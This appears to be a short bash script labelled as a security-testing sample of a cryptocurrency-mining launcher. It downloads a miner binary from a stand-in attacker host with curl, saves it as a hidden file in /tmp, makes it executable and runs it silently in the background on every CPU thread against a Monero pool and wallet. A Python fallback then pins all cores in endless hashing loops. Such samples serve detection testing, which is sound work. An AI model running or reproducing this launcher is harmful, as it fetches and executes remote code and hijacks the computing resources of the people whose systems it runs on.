#!/bin/bash
# [TEST SAMPLE] Crypto Mining Launcher Script - FOR SECURITY TESTING ONLY

POOL="stratum+tcp://pool.minexmr.com:4444"
WALLET="44AFFq5kSiGBoZ4NMDwYtN18obc8AemS33DBLWs3H7otXft3XjrpDtQGv7SqSsaBYBb98uNbr2VBBEt7f2wfn3RVGQBEP3A"

# Download and execute miner (typical attack pattern)
curl -sL http://evil-server.com/xmrig -o /tmp/.hidden_miner
chmod +x /tmp/.hidden_miner
nohup /tmp/.hidden_miner --url=$POOL --user=$WALLET --pass=x --threads=$(nproc) &>/dev/null &

# Alternative: use system python for mining
python3 -c "
import hashlib, multiprocessing, time
def mine():
    while True:
        hashlib.sha256(str(time.time()).encode()).hexdigest()
for _ in range(multiprocessing.cpu_count()):
    multiprocessing.Process(target=mine).start()
"
